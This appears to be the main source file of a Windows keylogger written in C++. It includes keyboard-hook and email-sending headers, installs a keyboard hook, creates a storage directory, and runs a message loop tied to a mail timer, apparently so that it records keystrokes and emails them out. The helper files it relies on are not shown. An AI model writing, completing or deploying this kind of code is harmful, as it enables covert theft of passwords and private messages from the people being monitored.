#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main()
{
	MSG Msg; //This is a message to be processed but it will never be processed
            IO::MKDir (IO::GetOurPath (true));

    InstallHook();


	while (GetMessage(&Msg, NULL, 0, 0) ) { //Main Thread
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

        MailTimer.Stop ();

    return 0    ;
}
